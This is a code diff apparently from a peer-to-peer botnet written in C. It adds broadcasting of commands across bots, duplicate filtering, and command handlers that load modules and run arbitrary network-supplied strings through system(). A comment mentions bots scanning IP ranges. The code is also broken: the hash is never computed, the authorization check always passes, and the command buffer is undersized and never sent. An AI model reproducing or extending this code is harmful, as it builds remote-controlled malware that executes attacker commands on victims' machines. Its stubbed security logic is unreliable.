@@ -40,6 +40,11 @@ ip generate seed can be used to ensure different bots scan different IPs
 // timeout after 100 seconds of nothing.. ping/pong at 60
 #define PING_ASK 60
 #define PING_TIMEOUT 100
+// how many old hashes to store for broadcasts?
+// will start at 64.. 16-20 is prob max ever required for millions
+#define MAX_HASH_COUNT 64
+
+uint32_t security_token = 0;
 
 extern ExternalModules *external_list;
 
@@ -114,9 +119,10 @@ typedef struct _bot_variables {
     // another option is to have a 'repeat' integer which gets decremented...
     // the issue is 'repeat' would be inside of the packet, and allows to be manipulated
     // this uses more memory.. ill test both and choose one
-    int p2p_sum_i;
-    uint32_t p2p_sums[64];
+    int broadcast_i;
+    uint32_t broadcast_hashlist[MAX_HASH_COUNT];
 } BotVariables;
+
 
 
 BotVariables *BotVars(Connection *cptr) {
@@ -132,6 +138,34 @@ BotVariables *BotVars(Connection *cptr) {
     return (BotVariables *)cptr->buf;
 }
 
+
+// returns -1 on error, 0 if it already exist.. 1 if its ok
+// itll automatically add it to the list..
+int Broadcast_DupeCheck(Modules *mptr, Connection *cptr, char *msg, int size) {
+    BotVariables *vars = BotVars(cptr);
+    uint32_t hash = 0;
+    int i = 0;
+    
+    if (vars == NULL) return -1;
+    
+    // calculate hash first
+    hash = hash;
+    
+    // now scan the prior hashes for this one..
+    for (i = 0; i < MAX_HASH_COUNT; i++) {
+        // 0 means it didnt even ever get filled..
+        if (vars->broadcast_hashlist[i] == 0) break;
+        
+        // if its found return 0 immediately..
+        if (vars->broadcast_hashlist[i] == hash)
+            return 0;
+    }
+    
+    // put the hash in the hash list
+    vars->broadcast_hashlist[vars->broadcast_i++ % MAX_HASH_COUNT] = hash;
+    
+    return 1;
+}
 
 
 // for port scanning.. we only care about nodes (starting new connections)
@@ -317,6 +351,92 @@ int bot_pushpkt(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
     return ret;
 }
 
+// uses a security token to sign/authorize a command..
+// ill have to find a decent cryptography method for this..
+uint32_t bot_cmdauthorize(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize) {
+    uint32_t ret = -1;
+    
+    // if we have no token (we didnt insert a security verification cert, or key to sign)
+    if (security_token == 0)
+        return ret;
+        
+
+    return ret;
+}
+
+// authorization roots (for signing/verification)
+typedef struct _authorization_root {
+    struct _authorization_root *next;
+    char *data;
+    int fd;
+    uint32_t start_ts;
+    
+    int len;
+} AuthorizationRoot;
+
+AuthorizationRoot *authroots = NULL;
+
+int AuthorizationInsert(char *data, int len, int copy) {
+    AuthorizationRoot *aptr = NULL;
+    aptr = (AuthorizationRoot *)L_add((LIST **)&authroots, sizeof(AuthorizationRoot));
+    if (aptr == NULL) return -1;
+    
+    if (!copy) {
+        aptr->data = data;
+    } else {
+        if ((aptr->data = (char *)malloc(len + 1)) == NULL)
+            return -1;
+
+        memcpy(aptr->data, data, len);
+    }
+    aptr->len = len;
+    
+    return 1;
+}
+
+bool AuthorizationCheck(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
+    uint32_t hash = 0;
+    int ret = false;
+    
+    hash = hash;
+    
+    // verify Authorization against roots
+    ret = true;
+
+    return ret;
+}
+
+
+
+int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, int pktsize) {
+    int ret = 0;
+    char *buf = NULL;
+    int size = pktsize + sizeof(CMDHdr);
+    CMDHdr *hdr = NULL;
+    
+    if ((buf = (char *)malloc(pktsize + 1)) == NULL) {
+        return -1;
+    }
+    
+    // setup header pointer.. and setup commands
+    hdr = (CMDHdr *)buf;
+    hdr->cmd = cmd;
+    hdr->size = pktsize;
+    // cryptographically sign/authorize the command
+    hdr->authorization = bot_cmdauthorize(mptr, cptr, cmd, pkt, pktsize);
+    // copy packet behind header
+    memcpy(buf + sizeof(CMDHdr), pkt, pktsize);
+
+    // send over to the main botlink packet command for distribution    
+    ret = bot_pushpkt(mptr, cptr, pkt, pktsize);
+    
+    // free the buffer
+    memset(buf,0,size);
+    free(buf);
+    
+    return ret;
+}
+
 
 int bot_pushmagic(Modules *mptr, Connection *cptr) {
     char vbuf[16];
@@ -489,11 +609,9 @@ enum {
 
 // push a ping, or pong to a bot
 int botlink_pingpong(Modules *mptr, Connection *cptr, int pong) {
-    char cmd[1];
+    unsigned char cmd = pong ? BOT_CMD_PONG : BOT_CMD_PING;
     
-    cmd[0] = pong ? BOT_CMD_PONG : BOT_CMD_PING;
-    
-    return bot_pushpkt(mptr, cptr, (char *)&cmd, 1);    
+    return bot_pushcmd(mptr, cptr, cmd, NULL, 0);    
 }
 
 // push a pong to the side requesting..
@@ -522,7 +640,10 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
     } BotCommands[] = {
         { BOT_CMD_PING, &botlink_cmd_ping, 0, false, false },
         { BOT_CMD_PONG, NULL, 0, false, false },
+        
+        // broadcast commands get verified before distribution
         { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, true, false },
+        
         { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, true, false },
         { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, true, false },
         { BOT_CMD_EXECUTE, &botlink_cmd_execute, true, true },
@@ -542,13 +663,30 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
     for (; BotCommands[i].function != NULL; i++) {
         if (BotCommands[i].cmd == hdr->cmd) {
             // we have to make sure the entire packet for this command exists
-            if ((size - sizeof(CMDHdr)) < BotCommands[i].minimum_size) {
+            if (BotCommands[i].minimum_size && (size - sizeof(CMDHdr)) < BotCommands[i].minimum_size) {
                 // lets be very paranoid, and kill connection
                 // with encryption, etc.. nothing will get this far by 'accident' fuck resync
                 ConnectionBad(cptr);
                 return 1;
             }
-        
+
+            // security / policy logic..
+            if (BotCommands[i].verify_hash) {
+                // if it doesnt pass authorization / signing verification then we disconnect the user
+                // this should be some secure public key process.. ill insert something obfuscation wise in mean time
+                if (!AuthorizationCheck(mptr, cptr, buf, size)) {
+                    ConnectionBad(cptr);
+                    return -1;
+                }
+            }
+            // verify that the command is possible via broadcasting if its coming from one
+            if (from_broadcast && BotCommands[i].bcast == false) {
+                // error.. security / policy problem..
+                // we will close connection immediately and exit..
+                ConnectionBad(cptr);
+                return -1;
+            }
+            
             // push to the correct command without the header
             if (BotCommands[i].function != NULL)        
                 ret = BotCommands[i].function(mptr, cptr, buf + sizeof(CMDHdr), size - sizeof(CMDHdr));
@@ -564,20 +702,46 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
 }
 
 int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
+    // execute it normally.. (not from a broadcast)
     return botlink_message_exec(mptr, cptr, buf, size, false);
 }
 
 // distributes a packet to the p2p network...
 // so we dont continously give the same packet to the same nodes..
 // we will verify against hashes already given to a node
-int botlink_p2p_distribute(Modules *mptr, Connection *cptr, char *buf, int size) {
+int botlink_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
+    Connection *bptr = mptr->connections;
+    int ret = 0;
     
+    // we must verify authorization before we broadcast it!
+    if (!AuthorizationCheck(mptr, cptr, buf, size)) {
+        ConnectionBad(cptr);
+        return -1;
+    }
+    
+    // bptr already starts at the list.. now iterate through it
+    while (bptr != NULL) {
+        // if state is OK then its connected
+        if (bptr->state == BOT_PERFECT) {
+            // if its not a duplicate of a prior message recently distributed
+            if (Broadcast_DupeCheck(mptr, cptr, buf, size)) {
+                // push broadcast command w the packet
+                if (bot_pushcmd(mptr, bptr, BOT_CMD_BROADCAST, buf, size) == 1)
+                    ret++;
+            }
+        }
+        
+        bptr = bptr->next;
+    }
+    
+    // return the amount of nodes distributed to
+    return ret;
 }
 
 // allows us to give a full packet inside of a broadcast command to be executed on every bot
 int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
     // we must distribute this command to each bot we have..
-
+    botlink_broadcast(mptr, cptr, buf, size);
 
     // and then finally we execute it ourselves
     return botlink_message_exec(mptr, cptr, buf, size, true);
@@ -615,7 +779,9 @@ int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int siz
 
 // executes a command from a p2p stream
 int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size) {
+    
     system(buf);
+    
     return 1;
 }
 
